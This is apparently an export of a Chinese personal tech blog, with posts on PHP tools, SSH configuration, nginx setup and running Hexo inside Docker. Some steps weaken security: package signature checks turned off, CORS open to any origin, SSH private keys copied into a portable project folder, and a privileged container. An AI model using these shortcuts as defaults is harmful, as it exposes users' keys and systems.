<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocC1idWlsZC9waHAtYnVpbGQ=" title="https://github.com/php-build/php-build">PHP Build <i class="fa fa-external-link"></i></span> - 另一个PHP版本工具</li>
<li><span class="exturl" data-url="aHR0cDovL3ZpcnRwaHAub3JnLw==" title="http://virtphp.org/">VirtPHP <i class="fa fa-external-link"></i></span> - 一个创建和管理分离的PHP环境的工具</li>
</ul>
<h2 id="开发环境-Development-Environment"><a href="#开发环境-Development-Environment" class="headerlink" title="开发环境(Development Environment)"></a>开发环境(Development Environment)</h2><blockquote>
<p>创建沙箱开发环境的软件和工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cudmFncmFudHVwLmNvbS8=" title="https://www.vagrantup.com/">Vagrant<i class="fa fa-external-link"></i></span> - 一个轻便的创建开发环境的工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5zaWJsZS5jb20v" title="https://www.ansible.com/">Ansible <i class="fa fa-external-link"></i></span> - 一个简单的业务流程框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9wdXBwZXRsYWJzLmNvbS8=" title="https://puppetlabs.com/">Puppet<i class="fa fa-external-link"></i></span> - 服务器自动化框架和应用</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9wdXBocGV0LmNvbS8=" title="https://puphpet.com/">PuPHPet<i class="fa fa-external-link"></i></span> - 一个用于构建PHP开发虚拟机工具</li>
<li><span class="exturl" data-url="aHR0cDovL2dldHByb3RvYm94LmNvbS8=" title="http://getprotobox.com/">Protobox<i class="fa fa-external-link"></i></span> - 另一个用于构建PHP开发虚拟机工具</li>
<li><span class="exturl" data-url="aHR0cDovL3BoYW5zaWJsZS5jb20v" title="http://phansible.com/">Phansible<i class="fa fa-external-link"></i></span> - 另一个用于构建PHP开发虚拟机工具</li>
</ul>
<h2 id="虚拟机-Virtual-Machines"><a href="#虚拟机-Virtual-Machines" class="headerlink" title="虚拟机(Virtual Machines)"></a>虚拟机(Virtual Machines)</h2><blockquote>
<p>替代的PHP虚拟机</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhY2Vib29rL2hodm0=" title="https://github.com/facebook/hhvm">HHVM <i class="fa fa-external-link"></i></span> - Facebook 开源的PHP虚拟机</li>
<li><span class="exturl" data-url="aHR0cDovL2hpcHB5dm0uY29tLw==" title="http://hippyvm.com/">HippyVM<i class="fa fa-external-link"></i></span> - 另一个PHP虚拟机</li>
</ul>
<h2 id="开发工具-Integrated-Development-Environment"><a href="#开发工具-Integrated-Development-Environment" class="headerlink" title="开发工具(Integrated Development Environment)"></a>开发工具(Integrated Development Environment)</h2><blockquote>
<p>支持PHP的IDE</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9uZXRiZWFucy5vcmcv" title="https://netbeans.org/">Netbeans<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNsaXBzZS5vcmcvZG93bmxvYWRzLw==" title="https://www.eclipse.org/downloads/">Eclipse for PHP Developers <i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5qZXRicmFpbnMuY29tL3BocHN0b3JtLw==" title="http://www.jetbrains.com/phpstorm/">PhpStorm <i class="fa fa-external-link"></i></span></li>
</ul>
<h2 id="Web-应用程序-Web-Applications"><a href="#Web-应用程序-Web-Applications" class="headerlink" title="Web 应用程序(Web Applications)"></a>Web 应用程序(Web Applications)</h2><blockquote>
<p>基于Web的应用程序和工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly8zdjRsLm9yZy8=" title="https://3v4l.org/">3V4L<i class="fa fa-external-link"></i></span> - Online PHP shell</li>
<li><span class="exturl" data-url="aHR0cDovL2Ridi52aXp1aW5hLmNvbS8=" title="http://dbv.vizuina.com/">DBV<i class="fa fa-external-link"></i></span> - 数据库版本控制应用程序</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NvZGVyS3VuZ2Z1L3BocC1xdWV1ZQ==" title="https://github.com/CoderKungfu/php-queue">PHP Queue<i class="fa fa-external-link"></i></span> - 管理队列的后端程序</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NqMjYvbWFpbGNhdGNoZXI=" title="https://github.com/sj26/mailcatcher">MailCatcher<i class="fa fa-external-link"></i></span> - 一个接受和查看邮件的程序</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NhY2hldGhxL2NhY2hldA==" title="https://github.com/cachethq/cachet">Cachet<i class="fa fa-external-link"></i></span> - 一个开源的网站状态展示系统(如: status.github.com )</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VyaWtEdWJiZWxib2VyL3BocFJlZGlzQWRtaW4=" title="https://github.com/ErikDubbelboer/phpRedisAdmin">phpRedisAdmin<i class="fa fa-external-link"></i></span> - Redis 管理工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocHBnYWRtaW4vcGhwcGdhZG1pbg==" title="https://github.com/phppgadmin/phppgadmin">phpPgAdmin <i class="fa fa-external-link"></i></span> - PostgreSQL管理工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocG15YWRtaW4vcGhwbXlhZG1pbg==" title="https://github.com/phpmyadmin/phpmyadmin">phpMyAdmin<i class="fa fa-external-link"></i></span> - MySQL管理工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2l3aW5kL3JvY2ttb25nbw==" title="https://github.com/iwind/rockmongo">rockmongo<i class="fa fa-external-link"></i></span> - MongoDB管理工具</li>
</ul>
<h2 id="基础设施-Infrastructure"><a href="#基础设施-Infrastructure" class="headerlink" title="基础设施(Infrastructure)"></a>基础设施(Infrastructure)</h2><blockquote>
<p>提供PHP应用程序和服务的基础设施</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL2FwcHNlcnZlci5pby8=" title="http://appserver.io/">appserver.io<i class="fa fa-external-link"></i></span> - 基于PHP的多线程应用程序服务器</li>
</ul>
<h2 id="其他-Miscellaneous"><a href="#其他-Miscellaneous" class="headerlink" title="其他( Miscellaneous )"></a>其他( Miscellaneous )</h2><blockquote>
<p>不属于以上分类的有用的类库和工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL292ZXJ0cnVlL3Bpbnlpbg==" title="https://github.com/overtrue/pinyin">pinyin<i class="fa fa-external-link"></i></span> - 汉字转拼音的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ppZmVpL1Bpbnlpbg==" title="https://github.com/jifei/Pinyin">Pinyin<i class="fa fa-external-link"></i></span> - 汉字转拼音的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Zlcm90L2NsYXNzLnVwbG9hZC5waHA=" title="https://github.com/verot/class.upload.php">class.upload.php<i class="fa fa-external-link"></i></span> - 文件上传处理类</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phc29uZ3JpbWVzL3BocC1wYWdpbmF0b3I=" title="https://github.com/jasongrimes/php-paginator">php-paginator<i class="fa fa-external-link"></i></span> - 分页处理类</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JyaWFuaGF2ZXJpL1VuZGVyc2NvcmUucGhw" title="https://github.com/brianhaveri/Underscore.php">Underscore.php<i class="fa fa-external-link"></i></span> - Underscore.js的PHP实现</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BkYS9mbGV4aWhhc2g=" title="https://github.com/pda/flexihash">Flexihash<i class="fa fa-external-link"></i></span> - 一致性hash库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL09wZW5vdmF0ZS9lZGVu" title="https://github.com/Openovate/eden">Eden<i class="fa fa-external-link"></i></span> - 一个PHP快速开发类库,它包含很多组件用来自动加载、事件驱动、文档系统、缓存、模板、国际化、数据库、web服务、支付网关、装载和云服务技术。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2J1cHQxOTg3L2h0bWwtcGFyc2Vy" title="https://github.com/bupt1987/html-parser">html-parser<i class="fa fa-external-link"></i></span> - html解析工具</li>
<li><p><span class="exturl" data-url="aHR0cDovL3BocGNyYXdsLmN1YWIuZGUv" title="http://phpcrawl.cuab.de/">PHPCrawl<i class="fa fa-external-link"></i></span> - PHP的爬虫框架</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3llc3phby9hd2Vzb21lLXBocA==" title="https://github.com/yeszao/awesome-php">文章来源<i class="fa fa-external-link"></i></span> - 文章来源</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>「linux」ssh笔记-ssh终端使用入门和配置</title>
    <url>/2018/11/11/%E3%80%90linux%E3%80%91ssh%E7%AC%94%E8%AE%B0-ssh%E7%BB%88%E7%AB%AF%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h4 id="1-ssh保持连接"><a href="#1-ssh保持连接" class="headerlink" title="1 ssh保持连接"></a>1 <code>ssh</code>保持连接</h4><p>  &emsp;<code>ssh</code>如果连接后没有操作就会被防火墙断开,也为防止这种情况出现,以每隔一定的间隔时间向远程端发送空数据包来保持连接.在<code>~/.ssh/config</code>添加:<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">Host    *                <span class="comment">#任何主机</span></span><br><span class="line">ServerAliveInterval 60   <span class="comment">#每60秒发送空数据包给远端</span></span><br><span class="line">ServerAliveCountMax 3    <span class="comment">#远端连续不响应3次,断开</span></span><br></pre></td></tr></table></figure></div></p>
<p>或者在服务端口<code>/etc/ssh/sshd_config</code>的<code>ClientAliveInterval 300</code>（默认0),区别于以上的是，这是从服务器发送心跳。<br>更多参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGFuZGEyMDQ2L3AvNTkzMzQ5OC5odG1s" title="https://www.cnblogs.com/panda2046/p/5933498.html">linux ssh_config和sshd_config配置文件学习<i class="fa fa-external-link"></i></span></p>
<a id="more"></a>
<h4 id="2-ssh别名免密登录"><a href="#2-ssh别名免密登录" class="headerlink" title="2 ssh别名免密登录"></a>2 <code>ssh</code>别名免密登录</h4><div class="note info">
            <p>别名免码登录是指通过自定义的别名和本地的密钥的方式来登录远程机。经常登录主机要打用户名的,主机名和密码，别名能省略当中操作,降低登录的人工成本</p>
          </div>
<p>   &emsp;如果没有密钥，输入<code>ssh-keygen -t rsa -C &quot;&lt;your email&gt;&quot;</code>后一路回车。然后<code>ssh-copykey [user]@[host] -p [port]</code>输入密码，把本地公钥复制到远程主机上。然后在<code>~/.ssh/config</code>加入以下配置。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">Host             <span class="built_in">alias</span>          <span class="comment">#别名</span></span><br><span class="line">User             root           <span class="comment">#登录名</span></span><br><span class="line">Hostname         127.0.0.1      <span class="comment">#主机地址</span></span><br><span class="line">IdentityFile    ~/.ssh/id_rsa   <span class="comment">#密钥文件</span></span><br><span class="line">Port            22              <span class="comment">#远程主机端口</span></span><br></pre></td></tr></table></figure></div></p>
<p>最后终端输入<code>ssh alias</code>驾车就能登录。</p>
<h4 id="3-ssh终端僵死退出快捷键"><a href="#3-ssh终端僵死退出快捷键" class="headerlink" title="3 ssh终端僵死退出快捷键"></a>3 <code>ssh</code>终端僵死退出快捷键</h4><p><code>sssh</code>连接不加心跳，过一段时间会断开并僵死。按<code>回车~.</code>来退出。</p>
<h4 id="4-把ssh会话切换回本地"><a href="#4-把ssh会话切换回本地" class="headerlink" title="4 把ssh会话切换回本地"></a>4 把ssh会话切换回本地</h4><p>当我们连接了远程主机时，需要临时把切换回本地操作，又不想断开远程的连接时，按<code>~ CTRl+z</code> 就可以回到本地并远程的连接作为后台任务隐藏起来。<br>当需要再次回来远程连接时，输入<code>fg</code>或<code>fg &lt;任务&gt;</code>编号重新切换到连接会话。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>「linux」docker笔记-nginx反向代理配置和多个web应用</title>
    <url>/2018/11/10/%E3%80%90linux%E3%80%91docker%E7%AC%94%E8%AE%B0-nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE%E5%92%8C%E5%A4%9A%E4%B8%AAweb%E5%BA%94%E7%94%A8%E5%AE%B9%E5%99%A8%E5%B8%83%E7%BD%B2/</url>
    <content><![CDATA[<p><img src="/images/docker和nginx反向代理.png" alt="nginx反向代理配置和多个web应用布署
"><br><a id="more"></a></p>
<h4 id="1-需求说明"><a href="#1-需求说明" class="headerlink" title="1 需求说明"></a>1 需求说明</h4><p>   &emsp;<code>docker</code>改变了应用堆栈的概念，使用每一个复杂的应用不再是一个耦合性强的架构，而是一堆零散的容器，每个容器只提供单一一服务，然后集成为一个功能强大的应用。由于容器的应用,大大简化了应用开发布署迁移的难度。<br>   &emsp;在布署<code>web</code>应用时，每一个容器最好不要存放多个<code>web</code>应用。而应该分散为多个容器来存放。而当有多个<code>web</code>应用容器时，这些容器都要从宿主主接收<code>80</code>端口的访问请求，而当启用一个容器占用了一个端口时，其它的<code>web</code>容器是使用不了<code>80</code>这个端口的，这种情况将导致只能有一个容器能被正常访问。而本文将介绍另一种方法。借助<code>nginx</code>的请求反向代理功能来实现多个<code>web</code>应用个容器都能通过<code>80</code>端口来访问的情况。</p>
<h4 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2 准备工作"></a>2 准备工作</h4><ul>
<li>主机上已经安装好<code>docker</code>和<code>nginx</code>;</li>
<li>基本的<code>docker</code>常识和基本的<code>nginx</code>配置常识<br>注：注意：本次演示是使用<code>centos 7</code> ，<code>nginx</code>是<code>yum</code>安装默认路径,如果是编译安装的,请根据自己情况来操作。<code>centos7 yum</code>安装请参考<a href="/2018/11/09/【linux】nginx笔记-入手准备/">《nginx笔记-入手准备》</a></li>
<li>准备一个域名，如果没有就自己定一个，然后本地<code>hosts</code>解析;</li>
</ul>
<h4 id="3-思路"><a href="#3-思路" class="headerlink" title="3 思路"></a>3 思路</h4><p>  &emsp;<code>nginx</code>监听<code>80</code>端口所有的请求，然后根据请求的域名来决定要哪个请求反向到哪个容器的端口。从而实现了多个容器的访问。</p>
<h4 id="4-方案流程"><a href="#4-方案流程" class="headerlink" title="4 方案流程"></a>4 方案流程</h4><ul>
<li>域名解析域名解析2个域名;</li>
<li>创建2个站点应用目录(下方简称:应用1和应用2);</li>
<li>新建3份<code>nginx</code>配置文件，一份是宿主的<code>nginx</code>的反向代理配置(下文简称：代理配置);2份是用于分别挂载到2个<code>docker</code>容器中(下文简称:应用1配置和应用2配置);</li>
<li>运行2个容器并将对应的应用文件和对应配置文件挂载进去。然后测试;</li>
</ul>
<h4 id="5-好，开干！"><a href="#5-好，开干！" class="headerlink" title="5 好，开干！"></a>5 好，开干！</h4><h5 id="5-1-本地测试域名"><a href="#5-1-本地测试域名" class="headerlink" title="5.1 本地测试域名"></a>5.1 本地测试域名</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/etc/hosts</span></span><br><span class="line">app1.com    127.0.0.1 <span class="comment">#应用1域名</span></span><br><span class="line">app2.com    127.0.0.1 <span class="comment">#应用2域名</span></span><br></pre></td></tr></table></figure></div>
<h5 id="5-2-创建2个站点应用目录"><a href="#5-2-创建2个站点应用目录" class="headerlink" title="5.2 创建2个站点应用目录"></a>5.2 创建2个站点应用目录</h5><p>  &emsp;新建2个目录用于存放应用的源数据。目录树如下。<br><img src="/images/20181115/20181115112537.png" alt="nginx反向代理"></p>
<p>j### 6 总结和讨论</p>
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>「nginx」nginx笔记-入手准备</title>
    <url>/2018/11/09/%E3%80%90linux%E3%80%91nginx%E7%AC%94%E8%AE%B0-%E5%85%A5%E6%89%8B%E5%87%86%E5%A4%87/</url>
    <content><![CDATA[<h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><ul>
<li>centos7 yum 源安装，新增官方源文件<code>/etc/yum.repos.d/nginx.repo</code>,内容如下:<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">[nginx]</span><br><span class="line">name=nginx repo</span><br><span class="line">baseurl=http://nginx.org/packages/centos/7/<span class="variable">$basearch</span>/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure></div>
</li>
</ul>
<p>&emsp;接着运行<code>sudo yum clean all &amp;&amp; sudo yum makecache &amp;&amp; sudo yum install -y nginx</code>进行安装。<br><a id="more"></a></p>
<h3 id="2-跨域响应头字段声明"><a href="#2-跨域响应头字段声明" class="headerlink" title="2 跨域响应头字段声明"></a>2 跨域响应头字段声明</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">add_header Access-Control-Allow-Origin *;</span><br><span class="line">add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS';</span><br><span class="line">add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization';</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title>「linux」hexo基于docker上运行,并发表到gitlab</title>
    <url>/2018/10/13/%E3%80%90linux%E3%80%91%E8%BF%81%E7%A7%BBhexo%E5%88%B0docker%E5%B9%B6%E5%8F%91%E8%A1%A8%E5%88%B0gitlab%E4%B8%8A/</url>
    <content><![CDATA[<p><img src="/images/pasted-1.png" alt="upload successful"></p>
<h4 id="一-需求说明"><a href="#一-需求说明" class="headerlink" title="一 需求说明"></a>一 需求说明</h4><ul>
<li>需求1:<code>hexo</code>快速迁机.<code>hexo</code>的源文件是存放在一台主机上的.而到了后期迁机会带来一系列麻烦,不是很方便.需要寻找一种能快速迁机的方法.</li>
<li>需求2:让百度收录<code>hexo</code>页面.我之前<code>hexo</code>生成的静态文件是发布到<code>github</code>上的,考虑到<code>github</code>禁止百度抓取网页,导致百度将不能收录博客上的文章.需要实现百度能抓取网站收录的方法.<a id="more"></a>
</li>
</ul>
<h5 id="1-需求解决方案说明"><a href="#1-需求解决方案说明" class="headerlink" title="1 需求解决方案说明."></a>1 需求解决方案说明.</h5><h6 id="1-1-关于”hexo快速迁机”实现说明"><a href="#1-1-关于”hexo快速迁机”实现说明" class="headerlink" title="1.1 关于”hexo快速迁机”实现说明."></a>1.1 关于”<code>hexo</code>快速迁机”实现说明.</h6><p>&emsp;<code>hexo</code>基于<code>docker</code>可以实现快速迁机.流程操作步骤如下(点击查看实例):<br>&emsp;&emsp; <a href="#1.1.1" target="_self">1.1.1 配置<code>dockerfile</code>文件并构建<code>hexo</code>项目;</a><br>&emsp;&emsp; <a href="#1.1.2" target="_self">1.1.2 收集迁机所需要的文件;</a><br>&emsp;&emsp; <a href="#1.1.3" target="_self">1.1.3 迁机测试;</a><br>&emsp;&emsp; <a href="#1.1.4" target="_self">1.1.4 迁机小结和讨论;</a>    </p>
<h6 id="1-2-关于”让百度收录hexo页面”实现说明"><a href="#1-2-关于”让百度收录hexo页面”实现说明" class="headerlink" title="1.2 关于”让百度收录hexo页面”实现说明."></a>1.2 关于”让百度收录<code>hexo</code>页面”实现说明.</h6><p>&emsp;由于<code>gitlab</code>是允许百度抓取的,所以将发布到<code>github</code>的页面改为<code>gitab</code>,实现百度收录.</p>
<ul>
<li>注:由于这个时间不够,只能下次再补上<code>gitlab</code>的相关教程了,这里是<code>gitlab</code>的<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuY29tL3BhZ2VzL2hleG8=" title="https://gitlab.com/pages/hexo"><code>hexo</code>官方教程<i class="fa fa-external-link"></i></span>,把例子拉下来再把<code>markdown</code>和主题挂上去再推送上去就行了,嗯,就这简单</li>
</ul>
<h5 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2 准备工作"></a>2 准备工作</h5><ul>
<li>安装好<code>docker</code>工具,没有安装的可以参考<span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW1hZ2UvcHVsbC5odG1s" title="https://yeasy.gitbooks.io/docker_practice/image/pull.html">docker-从入门到实踐<i class="fa fa-external-link"></i></span>进行安装;</li>
<li>一个<code>gitlab</code>帐号,没有帐号去<span class="exturl" data-url="aHR0cHM6Ly9hYm91dC5naXRsYWIuY29t" title="https://about.gitlab.com"><code>gitlab</code>官网<i class="fa fa-external-link"></i></span>注册.</li>
</ul>
<h5 id="3-方案最终实现的理想结果"><a href="#3-方案最终实现的理想结果" class="headerlink" title="3 方案最终实现的理想结果"></a>3 方案最终实现的理想结果</h5><p>&emsp; 在任意一台安装<code>docker</code>且联网的主机上导入打包好的源码文件,一键自动化完成迁移,并实现在容器中发布能被百度收录的网站,实现快捷完全迁机,并且跟原来原来宿主主机的环境基本一致.</p>
<ul>
<li>整个源码文件+<code>docke</code>构建文件,用一条命令在已经安装好<code>docker</code>且能联网的主机上，自动化构建镜像完成全部自动化布署。由于我已经预见结果了，就先说下成功总结:由于镜像是由<code>dockfile</code>构建的非黑盒镜像，<code>dockefile</code>几乎不占用空间，而且<code>hexo</code>需要的依赖库由于会在构建时自动化下载，可以在源码文件中删除掉。所以整个项目的迁移大小其实就是你写的一些<code>markdown</code>文本和静态文件加上一个40多M的<code>hexo</code>框架,整个迁机的过程是非常轻量化的，操作很方便。</li>
</ul>
<h4 id="二-好，开干"><a href="#二-好，开干" class="headerlink" title="二 好，开干"></a>二 好，开干</h4><h5 id="实例-1-1-1-配置dockerfile文件并构建hexo项目"><a href="#实例-1-1-1-配置dockerfile文件并构建hexo项目" class="headerlink" title="实例:1.1.1 配置dockerfile文件并构建hexo项目;"></a>实例:<span id="1.1.1">1.1.1 配置<code>dockerfile</code>文件并构建<code>hexo</code>项目;</span></h5><p>&emsp;新建一个任意目录并进入,这里用<code>hexo</code>目录做演示<code>mkdir hexo &amp;&amp; cd  hexo;</code>.以下是<code>Dockerfile</code>构建文件内容并保存起来,也可以根据自己的需求来定制.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">        <span class="comment">#基于debian 8.8</span></span><br><span class="line">FROM    node:8.2.0</span><br><span class="line">        <span class="comment"># 安装hexo推送依赖git工具</span></span><br><span class="line">RUN     apt-get upgrade -y  \</span><br><span class="line">        &amp;&amp; apt-get -y install git \</span><br><span class="line">        <span class="comment">#git用户名,如:</span></span><br><span class="line">        &amp;&amp; git config  --global user.name <span class="string">"wuchuheng"</span> \</span><br><span class="line">        <span class="comment">#git用户email,如:</span></span><br><span class="line">        &amp;&amp; git config  --global user.email <span class="string">"wuchuheng@163.com"</span> \</span><br><span class="line">        <span class="comment"># 淘宝npm镜像</span></span><br><span class="line">        &amp;&amp; npm install -g cnpm --registry=https://registry.npm.taobao.org \</span><br><span class="line">        <span class="comment"># 安装hexo命令行工具</span></span><br><span class="line">        &amp;&amp; cnpm install -g hexo-cli \</span><br><span class="line">        <span class="comment">#初始化hexo项目目录,置于/hexo</span></span><br><span class="line">        &amp;&amp; hexo init /hexo &amp;&amp; <span class="built_in">cd</span> /hexo \</span><br><span class="line">        <span class="comment">#根据自己喜好来安装插件,如:</span></span><br><span class="line">        <span class="comment">#git 插件用于推送到仓库,必备插件之一,</span></span><br><span class="line">        &amp;&amp; cnpm install hexo-deployer-git --save \</span><br><span class="line">        <span class="comment">#RRS功能插件</span></span><br><span class="line">        &amp;&amp; cnpm install hexo-generator-feed --save \</span><br><span class="line">        <span class="comment">#next主题本地搜索插件,查找资料很管用不用next主题的可以不用</span></span><br><span class="line">        &amp;&amp; cnpm install hexo-generator-searchdb --savea \</span><br><span class="line">        <span class="comment">#安装next主题,如果不喜欢默认主题就选择自己喜欢的来安装</span></span><br><span class="line">        &amp;&amp; git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next /hexo/themes/next \</span><br><span class="line">        <span class="comment">#next 本地搜索</span></span><br><span class="line">        &amp;&amp; cnpm install hexo-generator-searchdb --save;</span><br><span class="line"></span><br><span class="line">WORKDIR /hexo</span><br><span class="line"></span><br><span class="line">EXPOSE 4000</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [<span class="string">"hexo"</span>,<span class="string">"server"</span>]</span><br></pre></td></tr></table></figure></div>
<p>&emsp;保存好构建文件<code>Dockerfile</code>,目录<code>hexo</code>下执行命令开始构建镜像:<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker.servic; <span class="comment"># 启动docker</span></span><br><span class="line">sudo docker build -t hexo:0.1 . ;   <span class="comment"># 本地构建自定义镜像hexo 0.1</span></span><br></pre></td></tr></table></figure></div></p>
<p><code>suodo docker images;</code>查看已经生成的镜像:<br><img src="/images/20181016004526.png" alt="镜像列表"></p>
<h5 id="实例-1-1-2-收集迁机所需要的文件"><a href="#实例-1-1-2-收集迁机所需要的文件" class="headerlink" title="实例:1.1.2 收集迁机所需要的文件"></a>实例:<span id="1.1.2">1.1.2 收集迁机所需要的文件</span></h5><p>&emsp;统一的<code>rsa</code>文件能确保<code>hexo</code>发布问题.本地<code>hexo</code>目录下将本地<code>rsa</code>文件复制<code>cp ~/.ssh ./ -r ;</code>;如没有<code>.ssh</code>目录,就 <code>ssh-keygen -t rsa -C &quot;&quot; ;</code>一路回车就行,然后重复上面操作.<code>hexo</code>结果目录如下.<br><img src="/images/201810172047.png" alt="镜像列表"><br>&emsp;现在要将容器中的<code>hexo</code>目录下的<code>source</code>和<code>themes</code>目录和<code>_config.yml</code>导出来到本地迁机目录<code>hexo</code>下.<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sudo docker run -it -v <span class="variable">$PWD</span>/tmp/:/tmp --name hexo hexo:0.1 /bin/bash ;</span><br><span class="line">cp -r /hexo/<span class="built_in">source</span>/ /hexo/_config.yml  /hexo/themes/ /tmp ;</span><br></pre></td></tr></table></figure></div></p>
<p><img src="/images/20181017211401.png" alt="收集迁机文件"></p>
<h5 id="实例-1-1-3-迁机测试"><a href="#实例-1-1-3-迁机测试" class="headerlink" title="实例:1.1.3 迁机测试;"></a>实例:<span id="1.1.3">1.1.3 迁机测试;</span></h5><p>&emsp;说明下:这里的迁机是指将本地的<code>.ssh</code>目录,<code>source</code>目录,<code>_config.yml</code>文件,<code>themes</code>目录通过<code>Dockerfile</code>将<code>hexo</code>的整个运行环境在容器给构建出来,然后再把我们的这个文章的源数据<code>source</code>,<code>themes</code>主题目录,用于推送的密钥<code>.ssh</code>和<code>hexo</code>配置文件<code>_config.yml</code>给挂载到容器对应的位置中去.然后在容器中启动<code>hexo</code>就行了.也就是说要迁机只要把这挂载的几个文件和目录以及这个<code>Dockerfile</code>给拿走就行了,其它的就不用管,它们会通过<code>Dockerfile</code>去生成就行了.真正实现了轻量级迁机.<br>&emsp;启动一个新的容器并将<code>hexo</code>目录下的文件对应挂载到容器上,映射<code>4000</code>端口;<code>sudo docker run -itd  -v $PWD/source/:/hexo/source/ -v $PWD/_config.yml:/hexo/_config.yml   -v $PWD/themes/:/hexo/themes -v $PWD/.ssh/:/root/.ssh/  --privileged=true --name hexo_debug -p 4000:4000 hexo:0.2 /bin/bash ;</code><br><img src="/images/20181017211401110.png" alt="启动容器"><br> 而当我在其它的主机生成容器成功运行,并能正常浏览迁机前的文章,说明我的这个想法是可行的.</p>
